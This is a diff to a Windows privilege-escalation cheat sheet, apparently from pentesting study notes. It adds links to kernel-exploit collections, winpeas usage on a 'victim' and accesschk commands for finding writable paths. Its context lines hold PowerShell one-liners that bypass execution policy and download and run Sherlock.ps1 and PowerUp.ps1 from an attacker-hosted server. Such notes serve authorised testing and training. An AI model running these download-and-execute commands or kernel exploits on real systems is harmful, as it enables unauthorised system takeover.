@@ -9,7 +9,15 @@ PS> cd $env:temp
 ```cmd
 cmd> cd %TEMP%
 ```
+* User Kernel only as last resort to Windows PrivEsc
 
+1. Exploit suggester
+`https://github.com/bitsadmin/wesng`
+
+2. Use pre-compiled binaries
+`https://github.com/SecWiki/windows-kernel-exploits`
+
+3. Watson for older systems
 
 ## Windows Native programs
 Those programs can be found on every post Win10 machines:
@@ -157,20 +165,32 @@ REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
 
 ```
 
-Start `winpeas.exe` on victim in Temp folder
-
+* Start `winpeas.exe` on victim in Temp folder
+* Different checks can be also checked separately like `winpeas.exe userinfo`
 
 
 * Older systems
 
-```
+```powershell
 # For older Systems use Sherlock
 powershell.exe -exec bypass -C "IEX(New-Object System.Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/Sherlock.ps1');Find-AllVulns"
 
 powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"
 
-#for newer Systems use winpeas
 ```
+
+### User Access Control rights check
+
+UAC rights show if the user can read or write files.
+
+Use accesscheck from sysinternals
+
+`accesschk.exe /accepteula`
+
+Check where the use has write access
+
+`.\accesschk.exe /accepteula user -w c:\`
+
 ## remote enumeration
 
 * enum4linux
